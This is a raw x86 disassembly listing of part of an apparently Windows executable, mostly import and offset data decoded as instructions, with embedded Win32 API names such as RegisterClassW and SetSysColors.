  412308:	fidiv  WORD PTR ds:0x35ec0001
  41230e:	add    DWORD PTR [eax],eax
  412310:	clc    
  412311:	xor    eax,0x36000001
  412316:	add    DWORD PTR [eax],eax
  412318:	or     al,0x36
  41231a:	add    DWORD PTR [eax],eax
  41231c:	push   ss
  41231d:	add    DWORD PTR ss:[eax],eax
  412320:	and    BYTE PTR [esi],dh
  412322:	add    DWORD PTR [eax],eax
  412324:	sub    BYTE PTR [esi],dh
  412326:	add    DWORD PTR [eax],eax
  412328:	xor    dh,BYTE PTR [esi]
  41232a:	add    DWORD PTR [eax],eax
  41232c:	cmp    al,0x36
  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc7],cl
  412441:	sub    eax,0x3
  412446:	add    BYTE PTR [eax],al
  412448:	add    BYTE PTR [eax],al
  41244a:	add    BYTE PTR [eax],al
  41244c:	jmp    0x0:0x4d49a9
  412453:	add    BYTE PTR [edx+0x24],bh
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
